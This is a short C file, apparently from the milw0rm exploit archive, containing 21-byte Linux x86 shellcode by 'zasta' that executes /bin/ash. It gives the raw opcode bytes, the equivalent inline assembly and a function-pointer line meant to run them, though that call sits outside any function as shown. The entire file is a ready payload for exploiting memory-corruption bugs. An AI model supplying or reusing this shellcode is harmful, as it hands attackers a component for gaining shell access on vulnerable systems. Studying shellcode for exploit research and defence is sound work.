/* 21 byte execve("/bin/ash",0,0); shellcode for linux x86
 * by zasta (zasta at darkircop.org) */
#include <unistd.h>
#include <stdio.h>
char shellcode[] =      "\x31\xc9\xf7\xe1\x04\x0b\x52\x68"
                        "\x2f\x61\x73\x68\x68\x2f\x62\x69"
                        "\x6e\x89\xe3\xcd\x80";
void code() {
        __asm__("
                xor %ecx,%ecx
                mul %ecx
                addb $0xb,%al
                push %edx
                push $0x6873612f
                push $0x6e69622f
                mov %esp,%ebx
                int $0x80
        ");
}
void (*ptr)() = (void(*)()) &shellcode[0];(*ptr)();


// milw0rm.com [2004-11-15]